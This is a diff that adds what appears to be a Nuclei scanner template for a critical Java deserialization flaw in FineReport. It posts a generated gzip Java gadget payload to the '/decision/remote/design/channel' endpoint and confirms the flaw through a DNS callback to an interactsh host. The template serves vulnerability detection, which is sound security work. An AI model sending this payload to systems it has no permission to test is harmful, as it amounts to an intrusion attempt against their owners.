@@ -1,0 +1,35 @@
+id: finereport-remote-channel-java-deserialization
+info:
+  name: FineReport Remote Channel Java Deserialization Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: dnslog,deserialization
+
+variables:
+  reverse: "{{interactsh-url}}"
+  javaPayload: "{{generate_java_gadget('dns', reverse, 'gzip')}}"
+
+http:
+  - method: POST
+    path:
+      - "/decision/remote/design/channel"
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "starts_with(hex_encode(body), '1f8b08')"
+          - "!contains(body, '</')"
+
+  - method: POST
+    path:
+      - "/decision/remote/design/channel"
+    body: "{{javaPayload}}"
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "starts_with(hex_encode(body), '1f8b08')"
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
